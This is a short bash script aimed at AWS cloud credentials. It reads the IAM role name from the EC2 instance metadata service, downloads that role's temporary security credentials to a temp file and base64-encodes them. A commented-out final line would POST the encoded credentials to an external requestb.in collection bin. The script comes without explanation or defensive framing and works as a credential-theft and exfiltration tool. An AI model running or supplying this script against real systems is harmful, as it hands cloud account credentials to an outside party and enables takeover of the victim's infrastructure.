#!/bin/bash
instance_profile=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${instance_profile} > /tmp/garbage
garbage=`base64 -w 0 /tmp/garbage`
#curl -X POST -d "garbage=${garbage}" http://requestb.in/REQUESTIBINID